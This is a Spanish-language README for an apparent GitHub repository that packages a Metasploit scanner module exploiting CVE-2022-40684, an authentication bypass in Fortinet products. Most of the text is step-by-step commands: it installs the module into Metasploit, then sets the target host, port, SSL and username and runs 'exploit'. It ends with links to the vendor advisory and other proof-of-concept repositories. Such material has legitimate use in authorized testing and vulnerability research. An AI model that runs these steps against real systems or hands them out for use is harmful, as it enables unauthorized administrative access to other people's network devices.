# CVE-2022-40684-metasploit-scanner

Una omisión de autenticación usando una ruta o canal alternativo en el producto de Fortinet.

# Preparación de la PoC

```bash
git clone https://github.com/TaroballzChen/CVE-2022-40684-metasploit-scanner
cd CVE-2022-40684-metasploit-scanner
mkdir -p ~/.msf4/modules/auxiliary/scanner/http
cp fortinet_product_auth_bypass.py ~/.msf4/modules/auxiliary/scanner/http/
chmod +x ~/.msf4/modules/auxiliary/scanner/http/fortinet_product_auth_bypass.py
msfconsole
```

# Uso de la PoC

```bash
set rhosts <vuln ip/host>
set rport <vuln port>
set rssl <default: true for https>
set username <default: admin>
exploit
```
# Resultado
![poc](https://user-images.githubusercontent.com/4558401/199529522-039b3769-2590-4240-a2f9-fe075bb36d43.png)

# Referencias 

- https://www.fortiguard.com/psirt/FG-IR-22-377
- https://github.com/horizon3ai/CVE-2022-40684
- https://github.com/carlosevieira/CVE-2022-40684
- https://github.com/Chocapikk/CVE-2022-40684
